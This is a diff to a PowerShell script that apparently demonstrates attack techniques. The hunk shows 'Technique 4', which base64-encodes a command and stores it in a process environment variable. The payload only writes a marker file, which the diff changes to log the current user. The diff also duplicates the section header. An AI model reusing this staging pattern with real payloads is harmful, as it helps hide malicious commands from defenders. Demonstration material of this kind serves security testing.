@@ -238,14 +238,17 @@ return $result
 # TECHNIQUE 4: ENVIRONMENT VARIABLE ABUSE
 # Store payload in env vars (process-level, not persistent)
 # ==========================================================================
+# ==========================================================================
+# TECHNIQUE 4: ENVIRONMENT VARIABLE ABUSE
+# Store payload in env vars (process-level, not persistent)
+# ===============================================================================
 function Set-EnvPayload {
     Write-Host "[+] Technique 4: Environment Variable Payload Storage" -ForegroundColor Green
-
-    # Define a payload command. Use single quotes for the outer string
-    # so inner double-quotes around the path/value are preserved.
-    $payload = 'Add-Content -Path "C:\temp\execution_marker.txt" -Value "Successfully executed payload via Env Var."'
+    
+    # Define a more visible payload: get system info and log it to a file.
+    $payload = 'Add-Content -Path "C:\temp\execution_marker.txt" -Value "Payload executed by user: $(whoami)"'
     $encodedPayload = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($payload))
-
+    
     # Store in environment variable (process-level, not persistent)
     [Environment]::SetEnvironmentVariable("DEMO_PAYLOAD", $encodedPayload, "Process")
 
